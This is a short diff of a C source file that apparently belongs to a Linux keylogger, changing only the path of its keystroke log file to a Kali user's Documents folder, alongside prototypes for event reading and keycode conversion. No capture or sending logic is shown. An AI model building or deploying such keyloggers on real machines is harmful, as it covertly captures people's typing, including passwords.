@@ -6,7 +6,7 @@
 #include <stdlib.h>
 #include <errno.h>
 
-#define LOGFILEPATH "/home/ferpalma21/keylogger.txt"
+#define LOGFILEPATH "/home/kali/Documents/keylogger.txt"
 
 char *getEvent();
 char *keycodeToChar(int code, int shift_pressed);
